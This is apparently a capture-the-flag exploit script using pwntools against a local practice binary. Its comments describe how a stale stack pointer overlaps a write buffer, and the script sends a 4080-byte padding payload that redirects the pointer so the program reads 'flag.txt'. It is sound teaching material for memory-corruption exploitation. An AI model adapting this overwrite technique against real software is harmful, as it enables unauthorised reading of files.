#!/usr/bin/env python

from pwn import *

# In the `setup` function, `mkdtemp` creates a temporary directory at a specified path based on a template
# The template is provided as a local array of chars `template`. 
# `mkdtemp` modifies the buffer in-place and returns a pointer to that buffer.
# The global static variable `tempdir` is assigned with that pointer, essentially a pointer to a zone on the stack
# In the function `memo_w`, an array `buf` is declared and and "collides" with the `tempdir` ptr.
# Therefore, we can overwrite what `tempdir` is pointing at such that when `memo_r` is called, it actually reads from `flag.txt`

target = process("./bin/ex1")

# pwndbg> p (char *)tempdir - (char *)buf
# $9 = 4080

# Choose `memo_w` option
target.sendline(b"1")

payload = 4080 * b'Z' + b"flag.txt\x00"
# Send payload to overwrite `tempdir`
target.sendline(payload)

# Choose `memo_r` option
target.sendline(b"2")

target.interactive()